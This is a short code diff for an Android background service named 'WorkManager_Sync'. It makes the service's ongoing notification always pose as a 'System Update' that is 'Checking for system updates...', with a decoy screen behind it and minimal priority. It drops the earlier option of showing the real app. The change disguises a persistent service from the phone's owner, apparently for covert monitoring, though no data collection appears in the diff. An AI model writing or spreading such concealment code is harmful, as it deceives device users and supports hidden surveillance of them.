@@ -507,26 +507,15 @@ public class WorkManager_Sync extends Service {
     }
 
     private Notification createNotification() {
-        boolean stealth = isStealthMode();
-        
-        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
+        Intent notificationIntent = new Intent(this, DecoyActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
                 this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
-        String title = stealth ? "System Update" : "System Stability Service";
-        String contentText;
-        
-        if (stealth) {
-            contentText = "Checking for system updates...";
-        } else {
-            contentText = "System is running normally";
-        }
-
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(title)
-                .setContentText(contentText)
-                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
+                .setContentTitle("System Update")
+                .setContentText("Checking for system updates...")
+                .setSmallIcon(R.drawable.ic_sprocket_gear)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
